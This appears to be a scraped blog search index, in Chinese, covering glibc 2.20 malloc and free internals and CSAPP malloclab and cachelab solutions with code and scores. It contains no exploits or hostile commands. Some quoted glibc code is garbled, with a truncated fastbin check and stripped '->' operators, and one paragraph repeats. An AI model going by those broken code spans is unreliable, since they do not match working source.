如果分配的chunk属于small bin，首先查找chunk所对应small bins数组的index，然后根据index获得某个small bin的空闲chunk双向循环链表表头，然后将最后一个chunk赋值给victim，如果victim与表头相同，表示该链表为空，不能从small bin的空闲chunk链表中分配。若victim为0，表示small bin并没有初始化。所以调用malloc_consolidate将该分配区fast bins中chunk进行合并。否则对该bin中最后一个chunk进行双向链表检查，检查上一个chunk的后一个是否是victim。正确之后，设置其控制位。最后将指针转化位mem返回给用户。 可以发现，这里并没有链表为空时的相应处理，这种情况会在之后进行处理。 /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in o","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:2","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_int_malloc"},{"categories":["Pwning"],"content":"_int_malloc()下面重点分析_int_malloc()： /* ------------------------------ malloc ------------------------------ */static void *_int_malloc (mstate av, size_t bytes){ INTERNAL_SIZE_T nb; /* normalized request size */ unsigned int idx; /* associated bin index */ mbinptr bin; /* associated bin */ mchunkptr victim; /* inspected/selected chunk */ INTERNAL_SIZE_T size; /* its size */ int victim_index; /* its bin index */ mchunkptr remainder; /* remainder from a split */ unsigned long remainder_size; /* its size */ unsigned int block; /* bit map traverser */ unsigned int bit; /* bit map traverser */ unsigned int map; /* current word of binmap */ mchunkptr fwd; /* misc temp for linking */ mchunkptr bck; /* misc temp for linking */ const char *errstr = NULL; 这里是定义的一些变量 /* Convert request size to internal form by adding SIZE_SZ bytes overhead plus possibly more to obtain necessary alignment and/or to obtain a size of at least MINSIZE, the smallest allocatable size. Also, checked_request2size traps (returning 0) request sizes that are so large that they wrap around zero when padded and aligned. */ checked_request2size (bytes, nb); checked_request2size()将请求的大小转化为chunk的大小，在_int_malloc()内部分配内存是以chunk为单位的。 /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */ if ((unsigned long) (nb) fd, victim)) != victim); if (victim != 0) { if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) { errstr = \"malloc(): memory corruption (fast)\"; errout: malloc_printerr (check_action, errstr, chunk2mem (victim)); return NULL; } check_remalloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } 如果chunk的大小在fast bins的范围内，首先尝试在fast bins中寻找适合的chunk。 首先根据所需chunk的大小获得该chunk所属fast bin的index，根据该index获得所需fast bin的空闲chunk链表的头指针，然后将头指针的下一个chunk作为空闲chunk链表的头部。为了加快从fast bins中分配chunk，处于fast bins中chunk的状态仍然保持为inuse状态，避免被相邻的空闲chunk合并，从fast bins中分配chunk，只需取出第一个chunk，并调用chunk2mem()函数返回用户所需的内存块。 /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if (in_smallbin_range (nb)) { idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin) { if (victim == 0) /* initialization check */ malloc_consolidate (av); else { bck = victim-bk; if (__glibc_unlikely (bck-fd != victim)) { errstr = \"malloc(): smallbin double linked list corrupted\"; goto errout; } set_inuse_bit_at_offset (victim, nb); bin-bk = bck; bck-fd = bin; if (av != \u0026main_arena) victim-size |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } } 如果分配的chunk属于small bin，首先查找chunk所对应small bins数组的index，然后根据index获得某个small bin的空闲chunk双向循环链表表头，然后将最后一个chunk赋值给victim，如果victim与表头相同，表示该链表为空，不能从small bin的空闲chunk链表中分配。若victim为0，表示small bin并没有初始化。所以调用malloc_consolidate将该分配区fast bins中chunk进行合并。否则对该bin中最后一个chunk进行双向链表检查，检查上一个chunk的后一个是否是victim。正确之后，设置其控制位。最后将指针转化位mem返回给用户。 可以发现，这里并没有链表为空时的相应处理，这种情况会在之后进行处理。 /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in o","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:2","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#sysmalloc"},{"categories":["Pwning"],"content":"malloc_consolidate static void malloc_consolidate(mstate av){ mfastbinptr* fb; /* current fastbin being consolidated */ mfastbinptr* maxfb; /* last fastbin (for loop control) */ mchunkptr p; /* current chunk being consolidated */ mchunkptr nextp; /* next chunk to consolidate */ mchunkptr unsorted_bin; /* bin header */ mchunkptr first_unsorted; /* chunk to link to */ /* These have same use as in free() */ mchunkptr nextchunk; INTERNAL_SIZE_T size; INTERNAL_SIZE_T nextsize; INTERNAL_SIZE_T prevsize; int nextinuse; mchunkptr bck; mchunkptr fwd; /* If max_fast is 0, we know that av hasn't yet been initialized, in which case do so below */ if (get_max_fast () != 0) { clear_fastchunks(av); unsorted_bin = unsorted_chunks(av); /* Remove each chunk from fast bin and consolidate it, placing it then in unsorted bin. Among other reasons for doing this, placing in unsorted bin avoids needing to calculate actual bins until malloc is sure that chunks aren't immediately going to be reused anyway. */ maxfb = \u0026fastbin (av, NFASTBINS - 1); fb = \u0026fastbin (av, 0); 将分配区最大的一个fast bin赋值给maxfb，第一个fast bin赋值给fb，然后遍历fast bins。 do { p = atomic_exchange_acq (fb, 0); if (p != 0) { do { check_inuse_chunk(av, p); nextp = p-\u003efd; 将空闲chunk链表的下一个chunk赋值给nextp。 /* Slightly streamlined version of consolidation code in free() */ size = p-\u003esize \u0026 ~(PREV_INUSE|NON_MAIN_ARENA); nextchunk = chunk_at_offset(p, size); nextsize = chunksize(nextchunk); 获得当前chunk的size，需要去除size中的PREV_INUSE和NON_MAIN_ARENA标志，并获取相邻的下一个chunk和下一个chunk的大小。 if (!prev_inuse(p)) { prevsize = p-\u003eprev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(p, bck, fwd); } 如果当前chunk的前一个chunk空闲，则将当前chunk与前一个chunk合并成一个空闲chunk，由于前一个chunk空闲，则当前chunk的prev_size保存了前一个chunk的大小，计算出合并后的chunk大小，并获取前一个chunk的指针，将前一个chunk从空闲链表中删除。 if (nextchunk != av-\u003etop) { nextinuse = inuse_bit_at_offset(nextchunk, nextsize); 如果与当前chunk相邻的下一个chunk不是分配区的top chunk，查看与当前chunk相邻的下一个chunk是否处于inuse状态。 if (!nextinuse) { size += nextsize; unlink(nextchunk, bck, fwd); } else clear_inuse_bit_at_offset(nextchunk, 0); first_unsorted = unsorted_bin-\u003efd; unsorted_bin-\u003efd = p; first_unsorted-\u003ebk = p; 如果与当前chunk相邻的下一个chunk处于inuse状态，清除当前chunk的inuse状态，则当前chunk空闲了。否则，将相邻的下一个空闲chunk从空闲链表中删除，并计算当前chunk与下一个chunk合并后的chunk大小。将合并后的chunk加入unsorted bin的双向循环链表中。 if (!in_smallbin_range (size)) { p-\u003efd_nextsize = NULL; p-\u003ebk_nextsize = NULL; } 如果合并后的chunk属于large bin，将chunk的fd_nextsize和bk_nextsize设置为NULL，因为在unsorted bin中这两个字段无用。 set_head(p, size | PREV_INUSE); p-\u003ebk = unsorted_bin; p-\u003efd = first_unsorted; set_foot(p, size); } 设置合并后的空闲chunk大小，并标识前一个chunk处于inuse状态，因为必须保证不能有两个相邻的chunk都处于空闲状态。然后将合并后的chunk加入unsorted bin的双向循环链表中。最后设置合并后的空闲chunk的foot，chunk空闲时必须设置foot，该foot处于下一个chunk的prev_size中，只有chunk空闲是foot才是有效的。 else { size += nextsize; set_head(p, size | PREV_INUSE); av-\u003etop = p; } 如果当前chunk的下一个chunk为top chunk，则将当前chunk合并入top chunk，修改top chunk的大小。 } while ( (p = nextp) != 0); 直到遍历完当前fast bin中的所有空闲chunk。 } } while (fb++ != maxfb); } 直到遍历完所有的fast bins。 else { malloc_init_state(av); check_malloc_state(av); }} 如果ptmalloc没有初始化，初始化ptmalloc。 ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:3","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#malloc_consolidate"},{"categories":["Pwning"],"content":"__libc_free void__libc_free (void *mem){ mstate ar_ptr; mchunkptr p; /* chunk corresponding to mem */ void (*hook) (void *, const void *) = atomic_forced_read (__free_hook); if (__builtin_expect (hook != NULL, 0)) { (*hook)(mem, RETURN_ADDRESS (0)); return; } 同样，这里检查了用户是否实现自定义的__free_hook。 if (mem == 0) /* free(0) has no effect */ return; p = mem2chunk (mem); if (chunk_is_mmapped (p)) /* release mmapped memory. */ { /* see if the dynamic brk/mmap threshold needs adjusting */ if (!mp_.no_dyn_threshold \u0026\u0026 p-\u003esize \u003e mp_.mmap_threshold \u0026\u0026 p-\u003esize \u003c= DEFAULT_MMAP_THRESHOLD_MAX) { mp_.mmap_threshold = chunksize (p); mp_.trim_threshold = 2 * mp_.mmap_threshold; LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2, mp_.mmap_threshold, mp_.trim_threshold); } munmap_chunk (p); return; } 如果当前free的chunk是通过mmap()分配的，调用munmap_chunk()函数unmap本chunk。munmap_chunk()函数调用munmap()函数释放mmap()分配的内存块。同时查看是否开启了mmap分配阈值动态调整机制，默认是开启的，如果当前free的chunk的大小大于设置的mmap分配阈值，小于mmap分配阈值的最大值，将当前chunk的大小赋值给mmap分配阈值，并修改mmap收缩阈值为mmap分配阈值的2倍。默认情况下mmap分配阈值与mmap收缩阈值相等，都为128KB。 ar_ptr = arena_for_chunk (p); _int_free (ar_ptr, p, 0);} 获取当前分配区指针，最后调用_int_free。 ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:4","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#__libc_free"},{"categories":["Pwning"],"content":"_int_free static void_int_free (mstate av, mchunkptr p, int have_lock){ INTERNAL_SIZE_T size; /* its size */ mfastbinptr *fb; /* associated fastbin */ mchunkptr nextchunk; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize; /* its size */ int nextinuse; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */ mchunkptr bck; /* misc temp for linking */ mchunkptr fwd; /* misc temp for linking */ const char *errstr = NULL; int locked = 0; size = chunksize (p); 获取其chunk size /* Little security check which won't hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by \"design\" from some intruder. */ if (__builtin_expect ((uintptr_t) p \u003e (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) { errstr = \"free(): invalid pointer\"; errout: if (!have_lock \u0026\u0026 locked) (void) mutex_unlock (\u0026av-\u003emutex); malloc_printerr (check_action, errstr, chunk2mem (p)); return; } /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ if (__glibc_unlikely (size \u003c MINSIZE || !aligned_OK (size))) { errstr = \"free(): invalid size\"; goto errout; } check_inuse_chunk(av, p); 上面的代码用于安全检查，chunk的指针地址不能溢出，chunk的大小必须大于等于MINSIZE且要求对齐。 /* If eligible, place chunk on a fastbin so it can be found and used quickly in malloc. */ if ((unsigned long)(size) \u003c= (unsigned long)(get_max_fast ())#if TRIM_FASTBINS /* If TRIM_FASTBINS set, don't place chunks bordering top into fastbins */ \u0026\u0026 (chunk_at_offset(p, size) != av-\u003etop)#endif ) { if (__builtin_expect (chunk_at_offset (p, size)-\u003esize \u003c= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize (chunk_at_offset (p, size)) \u003e= av-\u003esystem_mem, 0)) { /* We might not have a lock at this point and concurrent modifications of system_mem might have let to a false positive. Redo the test after getting the lock. */ if (have_lock || ({ assert (locked == 0); mutex_lock(\u0026av-\u003emutex); locked = 1; chunk_at_offset (p, size)-\u003esize \u003c= 2 * SIZE_SZ || chunksize (chunk_at_offset (p, size)) \u003e= av-\u003esystem_mem; })) { errstr = \"free(): invalid next size (fast)\"; goto errout; } if (! have_lock) { (void)mutex_unlock(\u0026av-\u003emutex); locked = 0; } } 如果当前free的chunk属于fast bins，查看下一个相邻的chunk的大小是否小于等于2*SIZE_SZ，下一个相邻chunk的大小是否大于分配区所分配的内存总量，如果是，报错。这里计算下一个相邻chunk的大小似乎有点问题，因为chunk的size字段中包含了一些标志位，正常情况下下一个相邻chunk的size中的PREV_INUSE标志位会置位，但这里就是要检出错的情况，也就是下一个相邻chunk的size中标志位都没有置位，并且该chunk大小为2*SIZE_SZ的错误情况。如果调用本函数前没有对分配区加锁， 所以读取分配区所分配的内存总量需要对分配区加锁，检查完以后，释放分配区的锁。 free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); set_fastchunks(av); unsigned int idx = fastbin_index(size); fb = \u0026fastbin (av, idx); 设置当前分配区的fast bin flag，表示当前分配区的fast bins中已有空闲chunk。然后根据当前free的chunk大小获取所属的fast bin。 /* Atomically link P to its fastbin: P-\u003eFD = *FB; *FB = P; */ mchunkptr old = *fb, old2; unsigned int old_idx = ~0u; do { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) { errstr = \"double free or corruption (fasttop)\"; goto errout; } /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been deallocated. See use of OLD_IDX below for the actual check. */ if (have_lock \u0026\u0026 old != NULL) old_idx = fastbin_index(chunksize(old)); p-\u003efd = old2 = old; } while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); if (have_lock \u0026\u0026 old != NULL \u0026\u0026 __builtin_expect (old_idx != idx, 0)) { errstr = \"invalid fastbin entry (free)\"; goto errout; } } 这里检查了当前释放的chunk和之前释放的fastbin chunk是否相同，相同则触发了double free，校验表头不为NULL情况下，保证表头chunk的所属的fast bin与当前free的chunk所属的fast bin相同。 /* Consolidate other non-mmapped chunks as they arrive. */ else if (!chunk_is_mmapped(p)) { if (! have_lock) { (void)mutex_lock(\u0026av-\u003emutex); locked = 1; } nextchunk = chunk_at_offset(p, size); 如果当前free的chunk不是通过mmap()分配的，并且当前还没有获得分配区","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:5","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_int_free"},{"categories":["Pwning"],"content":"End到这里，malloc的只要框架与逻辑就分析完了。在很多难懂得地方都参考了《ptmalloc源码分析》，推荐读一下。不过想要深入的理解堆的话，还是要自己动手实现一个内存分配器。这样才能知道哪一部分是要干什么的，也能更好的理解源码。这次仅仅是glibc-2.20，在新的glibc中有了新的机制，这部分在之后进行补充分析。 ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:7:0","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#end"},{"categories":["Pwning"],"content":"CSAPP-Malloclab大致框架使用课本上的示例，补充一些宏定义。 /* Basic constants and macros */ #define WSIZE 4 /* Word and header/footer size (bytes) */#define DSIZE 8 /* Double word size (bytes) */#define CHUNKSIZE (1\u003c\u003c12) /* Extend heap by this amount (bytes) */#define MINBLOCKSIZE 16 #define MAX(x, y) ((x) \u003e (y) ? (x) : (y)) /* Pack a size and allocated bit into a word */ #define PACK(size, alloc) ((size) | (alloc)) /* Read and write a word at address p */ #define GET(p) (*(unsigned int *)(p)) /* read a word at address p */#define PUT(p, val) (*(unsigned int *)(p) = (val)) /* write a word at address p */ #define GET_SIZE(p) (GET(p) \u0026 ~0x7) /* read the size field from address p */#define GET_ALLOC(p) (GET(p) \u0026 0x1) /* read the alloc field from address p */ #define HDRP(bp) ((char*)(bp) - WSIZE) /* given block ptr bp, compute address of its header */#define FTRP(bp) ((char*)(bp) + GET_SIZE(HDRP(bp)) - DSIZE) /* given block ptr bp, compute address of its footer */ #define NEXT_BLKP(bp) ((char*)(bp) + GET_SIZE(HDRP(bp))) /* given block ptr bp, compute address of next blocks */#define PREV_BLKP(bp) ((char*)(bp) - GET_SIZE((char*)(bp)-DSIZE)) /* given block ptr bp, compute address of prev blocks */ 此时，chunk的结构为： struct chunk{ int header; /*header==footer*/ char data[size]; char padding[align]; int footer; } 书中实现了mm_init, mm_malloc, mm_free, extend_heap, coalesce, 根据书中的代码我们实现： mm_realloc void *mm_realloc(void *ptr, size_t size) { void *new_ptr; if(ptr==NULL){ new_ptr=mm_malloc(size); if (new_ptr == NULL) return NULL; return new_ptr; } if(size==0){ mm_free(ptr); return NULL; } if(size==GET_SIZE(HDRP(ptr))){ return ptr; } else{ new_ptr=mm_malloc(size); if (new_ptr == NULL) return NULL; memcpy(new_ptr, ptr, size-WSIZE); mm_free(ptr); return new_ptr; } } place static void place(void *bp, size_t asize){ size_t size=GET_SIZE(HDRP(bp)); PUT(HDRP(bp),PACK(size, 1)); PUT(FTRP(bp),PACK(size, 1)); split_block(bp,asize); } split_block static void split_block(void *bp, size_t asize){ size_t size =GET_SIZE(HDRP(bp)); if((size-asize)\u003e=MINBLOCKSIZE){ PUT(HDRP(bp), PACK(asize, 1)); PUT(FTRP(bp), PACK(asize, 1)); bp = NEXT_BLKP(bp); PUT(HDRP(bp), PACK((size-asize),0)); PUT(FTRP(bp),PACK((size-asize),0)); coalesce(bp); } } next_fit static void *next_fit(size_t asize){ char* bp; for ( bp = prev_listp; GET_SIZE(HDRP(bp)) \u003e 0; bp = NEXT_BLKP(bp)) { if (!GET_ALLOC(HDRP(bp)) \u0026\u0026 GET_SIZE(HDRP(bp)) \u003e= asize) { prev_listp = bp; return bp; } } for ( bp = heap_listp; bp != prev_listp; bp = NEXT_BLKP(bp)) { if (!GET_ALLOC(HDRP(bp)) \u0026\u0026 GET_SIZE(HDRP(bp)) \u003e= asize) { prev_listp = bp; return bp; } } return NULL; } 这里使用的是隐式链表+next fit，得分： Results for mm malloc: trace valid util ops secs Kops 0 yes 91% 5694 0.001710 3329 1 yes 92% 5848 0.000948 6166 2 yes 95% 6648 0.002903 2290 3 yes 97% 5380 0.003700 1454 4 yes 66% 14400 0.000099146193 5 yes 91% 4800 0.004307 1114 6 yes 89% 4800 0.003500 1371 7 yes 55% 12000 0.014687 817 8 yes 51% 24000 0.007490 3204 9 yes 27% 14401 0.048774 295 10 yes 45% 14401 0.001818 7919 Total 73% 112372 0.089937 1249 Perf index = 44 (util) + 40 (thru) = 84/100 ","date":"2021-02-21","objectID":"/csapp-malloclab/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Malloclab","uri":"/csapp-malloclab/#csapp-malloclab"},{"categories":["Pwning"],"content":"改进：显式链表+first fit最开始使用的是first_fit只有50+，改为next_fit之后达到了80+，在搜索的时候几乎是在遍历整个堆段，所以想到使用显示链表的方法来管理空闲chunk。 修改free_chunk结构： struct chunk{ int header; /*header==footer*/ chunk *fd; /*prev free chunk*/ chunk *bk; /*next free chunk*/ int footer; } 添加定义： #define FD(bp) ((char *)(bp)) #define BK(bp) ((char *)(bp)+WSIZE) #define SET_PTR(p,ptr) (*(unsigned int *)(p) = (unsigned int)(ptr)) #define GET_NEXT(bp) (*(char **)(BK(bp))) #define GET_PREV(bp) (*(char **)(bp)) static char* free_listp; //manage all free chunk static void insert_freelist(void* bp); static void remove_freelist(void* bp); 这里的fd，bk与glibc中的malloc是相似的。 insert_freelist static void insert_freelist(void* bp) { if (bp == NULL) return; if (free_listp == NULL) { free_listp = bp; SET_PTR(FD(bp),NULL); //at the end of the list fd will be null; SET_PTR(BK(bp),NULL); //at the begin of the list bk will be null; } else { void *old=free_listp; free_listp = bp; SET_PTR(FD(bp),old); SET_PTR(BK(bp),NULL); SET_PTR(BK(old),bp); } return; } remove_freelist static void remove_freelist(void* bp) { if(GET_NEXT(bp)!=NULL) { if(GET_PREV(bp)!=NULL) /* free_listp--\u003exxx-\u003ebp--\u003exxx */ { SET_PTR(FD(GET_NEXT(bp)),GET_PREV(bp)); SET_PTR(BK(GET_PREV(bp)),GET_NEXT(bp)); } else /* free_listp--\u003exxx-\u003ebp */ { SET_PTR(FD(GET_NEXT(bp)),NULL); } } else { if(GET_PREV(bp)!=NULL) /* free_listp--\u003ebp--\u003exxx */ { SET_PTR(BK(GET_PREV(bp)),NULL); free_listp=GET_PREV(bp); } else /* free_listp--\u003ebp */ { free_listp=NULL; } } } first_fit static void *find_fit(size_t asize) { void *bp=free_listp; for(;bp!=NULL;bp=GET_PREV(bp)) { if(asize\u003c=GET_SIZE(HDRP(bp))) return bp; } return NULL; } 但是分数没有变化。 Results for mm malloc: trace valid util ops secs Kops 0 yes 89% 5694 0.000159 35789 1 yes 92% 5848 0.000106 55326 2 yes 94% 6648 0.000232 28717 3 yes 96% 5380 0.000177 30361 4 yes 100% 14400 0.000095151739 5 yes 88% 4800 0.000379 12668 6 yes 85% 4800 0.000507 9471 7 yes 55% 12000 0.004043 2968 8 yes 51% 24000 0.002807 8549 9 yes 26% 14401 0.058122 248 10 yes 34% 14401 0.002460 5854 Total 74% 112372 0.069087 1627 Perf index = 44 (util) + 40 (thru) = 84/100 ","date":"2021-02-21","objectID":"/csapp-malloclab/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Malloclab","uri":"/csapp-malloclab/#改进显式链表first-fit"},{"categories":["Pwning"],"content":"改进：分离链表+first fit依据2的次幂分为16个组：{1}，{2}，{3，4}，{5~8}，…，{1025~2048}，{2049~4096}… 修改宏定义： #define MAX_FREE_LIST 16 static void* free_listp[MAX_FREE_LIST]; static void insert_freelist(void* bp,size_t size); first_fit static void *first_fit(size_t asize) { int index=free_index(asize); void *bp=NULL; while(index\u003cMAX_FREE_LIST) { bp=free_listp[index]; while((bp!=NULL)\u0026\u0026(asize\u003eGET_SIZE(HDRP(bp)))) { bp = GET_PREV(bp); } if(bp!=NULL) return bp; index++; } return NULL; } free_index static int free_index(size_t size) { int index=0; while ((index\u003cMAX_FREE_LIST-1)) { if(size\u003e1) { size\u003e\u003e=1; index++; } else break; } return index; } 此版得分： trace valid util ops secs Kops 0 yes 98% 5694 0.000244 23307 1 yes 97% 5848 0.000362 16168 2 yes 96% 6648 0.000287 23156 3 yes 98% 5380 0.000518 10386 4 yes 100% 14400 0.000306 47105 5 yes 93% 4800 0.000338 14189 6 yes 90% 4800 0.000517 9283 7 yes 55% 12000 0.000311 38598 8 yes 51% 24000 0.000735 32666 9 yes 28% 14401 0.058034 248 10 yes 28% 14401 0.002643 5448 Total 76% 112372 0.064295 1748 Perf index = 46 (util) + 40 (thru) = 86/100 ","date":"2021-02-21","objectID":"/csapp-malloclab/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Malloclab","uri":"/csapp-malloclab/#改进分离链表first-fit"},{"categories":["Pwning"],"content":"改进：realloc在之前的版本中，realloc都依赖了malloc和free函数，实现很暴力。在改进中，若当前块的后一个块是free且相加后的大小满足需求就可以进行合并。 void *mm_realloc(void *ptr, size_t size) { void *new_ptr; size_t asize; if(ptr==NULL){ new_ptr=mm_malloc(size); if (new_ptr == NULL) return NULL; return new_ptr; } if(size==0){ mm_free(ptr); return NULL; } if(size \u003c= DSIZE) asize = 2*DSIZE; else asize = ALIGN(size + DSIZE); size_t oldsize=GET_SIZE(HDRP(ptr)); if(asize\u003c=oldsize){ place(ptr,asize); return ptr; } else{ size_t next_alloc=GET_ALLOC(HDRP(NEXT_BLKP(ptr))); size_t new_size; new_size=GET_SIZE(HDRP(NEXT_BLKP(ptr)))+oldsize; if(!next_alloc\u0026\u0026(asize\u003c=new_size)) //next is free { remove_freelist(NEXT_BLKP(ptr)); PUT(HDRP(ptr), PACK(new_size, 1)); PUT(FTRP(ptr), PACK(new_size, 1)); return ptr; } else { new_ptr=mm_malloc(size); if (new_ptr == NULL) return NULL; memcpy(new_ptr, ptr, size-WSIZE); mm_free(ptr); return new_ptr; } } } 这里我认为合并后可以再次细化进行分割，但是分割后分数反而低了（黑人？？？.jpg） Results for mm malloc: trace valid util ops secs Kops 0 yes 98% 5694 0.000216 26361 1 yes 97% 5848 0.000214 27340 2 yes 96% 6648 0.000308 21556 3 yes 98% 5380 0.000197 27365 4 yes 100% 14400 0.000250 57554 5 yes 93% 4800 0.000344 13970 6 yes 90% 4800 0.000310 15469 7 yes 55% 12000 0.000334 35907 8 yes 51% 24000 0.000761 31521 9 yes 99% 14401 0.000260 55367 10 yes 57% 14401 0.000234 61464 Total 85% 112372 0.003429 32771 Perf index = 51 (util) + 40 (thru) = 91/100 目前分数最高的一版。 ","date":"2021-02-21","objectID":"/csapp-malloclab/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Malloclab","uri":"/csapp-malloclab/#改进realloc"},{"categories":["Pwning"],"content":"CSAPP-Cachelab","date":"2021-02-14","objectID":"/csapp-cachelab/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Cachelab","uri":"/csapp-cachelab/#csapp-cachelab"},{"categories":["Pwning"],"content":"part A模拟cache #include \"cachelab.h\"#include \u003cstdio.h\u003e#include \u003cstring.h\u003e#include \u003cgetopt.h\u003e#include \u003cstdlib.h\u003e#include \u003cunistd.h\u003e#include \u003climits.h\u003e #define BUFFER_SIZE 50 char buf[BUFFER_SIZE]; int s; int E; int b; char *t; int cache_size; long long *cache; unsigned time_stamp; unsigned *last_used_time; int hit_count; int miss_count; int eviction_count; void memoryAccess(long long addr) { ++time_stamp; int set_idx = (addr \u003e\u003e b) \u0026 ((1 \u003c\u003c s) - 1); long long tag = addr \u003e\u003e (b + s); long long *set_cache = cache + set_idx * E; unsigned *set_used_time = last_used_time + set_idx * E; int i; unsigned LRU_i = -1; unsigned LRU_valid; unsigned LRU_time; for (i = 0; i \u003c E; ++i) { unsigned valid = set_cache[i] \u0026 1; long long tag_i = set_cache[i] \u003e\u003e 1; if (valid \u003e 0 \u0026\u0026 tag == tag_i) { ++hit_count; set_used_time[i] = time_stamp; return ; } else { if (LRU_i == -1 || valid \u003c LRU_valid || (valid == LRU_valid\u0026\u0026 set_used_time[i] \u003c LRU_time)) { LRU_i = i; LRU_valid = valid; LRU_time = set_used_time[i]; } } } ++miss_count; eviction_count += LRU_valid; set_used_time[LRU_i] = time_stamp; set_cache[LRU_i] = tag \u003c\u003c 1 | 1; } int main(int argc, char *argv[]) { char *optString = \"s:E:b:t:\"; int opt = getopt(argc, argv, optString); while (~opt) { switch (opt) { case 's': s = atoi(optarg); break; case 'E': E = atoi(optarg); break; case 'b': b = atoi(optarg); break; case 't': t = optarg; break; } opt = getopt(argc, argv, optString); } time_stamp = 0; hit_count = miss_count = eviction_count = 0; cache_size = E \u003c\u003c s; cache = (long long *) malloc(sizeof(*cache) * cache_size); last_used_time = (unsigned *) malloc(sizeof(*last_used_time) * cache_size); memset(cache, 0, sizeof(*cache) * cache_size); FILE *fp = fopen(t, \"r\"); while (fgets(buf, BUFFER_SIZE, fp) != NULL) { int len = strlen(buf); if (len \u003c= 2 || buf[0] != ' ') continue; char op = buf[1]; if (!(op == 'L' || op == 'S' || op == 'M')) continue; int i; for (i = 0; i \u003c len; ++i) if (buf[i] == ',') { buf[i] = '\\0'; break; } buf[1] = '0', buf[2] = 'x'; long long addr; sscanf(buf + 1, \"%llx\", \u0026addr); printf(\"op = %c, addr = %llx, \", op, addr); memoryAccess(addr); if (op == 'M') ++hit_count; } printSummary(hit_count, miss_count, eviction_count); fclose(fp); return 0; } ","date":"2021-02-14","objectID":"/csapp-cachelab/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Cachelab","uri":"/csapp-cachelab/#part-a"},{"categories":["Pwning"],"content":"part B要求实现数组转置，并且有限制： 缓存参数为：s = 5, E = 1, b = 5。 最多能够定义 12 个 int 类型的局部变量。 不允许修改矩阵 A，但能任意修改矩阵 B。 由就硬分块，分八块，加上一些变量能最大利用局部变量。32*32的矩阵分八块，将八块全部读入再写。64*64矩阵先分八块，再四块。61*67分16块。 64*64用了分块矩阵转置的知识 $$ \\begin{Bmatrix} A_{11} \u0026 A_{12} \\ A_{21} \u0026 A_{22} \\end{Bmatrix} = \\begin{Bmatrix} A^T_{11} \u0026 A^T_{21} \\ A^T_{12} \u0026 A^T_{22} \\end{Bmatrix} $$ 将其分为32*32的四块，子矩阵分八块转置，再分四块交换对角线子矩阵。 void transpose_submit(int M, int N, int A[N][M], int B[M][N]) { int i, j, k, h; int a1, a2, a3, a4, a5, a6, a7, a8; if(N==32) { for (i = 0; i \u003c N; i+=8) { for (j = 0; j \u003c M; j+=8) { for(k=i; k\u003ci+8; ++k) { a1 = A[k][j]; a2 = A[k][j+1]; a3 = A[k][j+2]; 